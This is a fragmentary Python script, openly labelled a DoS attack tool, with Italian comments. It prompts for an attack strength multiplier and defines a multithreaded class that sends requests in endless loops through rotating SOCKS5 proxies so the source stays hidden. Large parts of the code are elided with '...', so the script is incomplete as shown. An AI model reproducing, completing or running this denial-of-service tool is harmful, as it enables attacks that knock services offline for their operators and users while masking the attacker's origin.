#DoS ATTACK #DoS ATTACK #DoS ATTACK #DoS ATTACK #DoS ATTACK #DoS ATTACK #DoS ATTACK #DoS ATTACK #DoS ATTACK
import socket
import socks
import threading
import random
...
def multiplication():
    ...
    try:
        multiple = int(
            input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
    except ValueError:
        print("You mistyped, try again.\n")
        multiplication()
    begin()
...
class RequestProxyHTTP(threading.Thread):  # la classe del multithreading
    ...
    def __init__(self,
                 counter):  # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
        ...
        while True:  # ciclo infinito
            try:
                ...
                print("Request sent from " + str(proxy[0] + ":" + proxy[1]) + " @",
                      self.counter)  # print delle richieste
        ...
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]),
                                      True)  # comando per proxarci con i socks
